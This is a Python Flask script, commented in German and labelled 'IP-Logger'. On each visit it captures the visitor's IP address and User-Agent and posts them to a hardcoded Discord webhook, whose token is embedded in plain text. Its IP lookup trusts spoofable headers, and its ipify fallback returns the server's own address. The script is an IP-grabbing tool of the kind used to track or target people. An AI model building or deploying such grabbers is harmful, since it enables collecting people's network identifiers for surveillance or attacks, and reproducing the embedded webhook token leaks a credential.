from flask import Flask, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"

def get_real_ip():
    """
    Versucht die echte IP über mehrere Methoden zu bekommen.
    """
    # 1. Zuerst versuchen wir es über die Server-Header
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    
    # 2. Wenn keine Header, dann über externe API (das ist der wichtige Teil!)
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        if response.status_code == 200:
            return response.json().get('ip')
    except:
        pass
    
    # 3. Fallback: remote_addr
    return request.remote_addr

@app.route('/')
def home():
    # Echte IP ermitteln
    real_ip = get_real_ip()
    
    # User-Agent
    user_agent = request.headers.get('User-Agent', 'Unbekannt')
    
    # Discord Webhook
    embed = {
        "embeds": [{
            "title": "🕵️ Neue IP erfasst!",
            "color": 0xFF0000,
            "fields": [
                {
                    "name": "🌐 IP-Adresse",
                    "value": f"`{real_ip}`",
                    "inline": False
                },
                {
                    "name": "🖥️ User-Agent",
                    "value": f"```{user_agent[:150]}```",
                    "inline": False
                },
                {
                    "name": "⏰ Zeit",
                    "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "IP-Logger | Automatische Erkennung"
            }
        }]
    }
    
    # An Discord senden
    try:
        r = requests.post(WEBHOOK_URL, json=embed, timeout=10)
        print(f"[{datetime.now()}] Webhook Status: {r.status_code} - IP: {real_ip}")
    except Exception as e:
        print(f"[{datetime.now()}] Error: {str(e)}")
    
    # Einfache Antwort an den Besucher
    return f"""
    <h2>✅ IP erfasst!</h2>
    <p>Deine IP: <strong>{real_ip}</strong></p>
    <p>Die IP wurde an Discord gesendet.</p>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
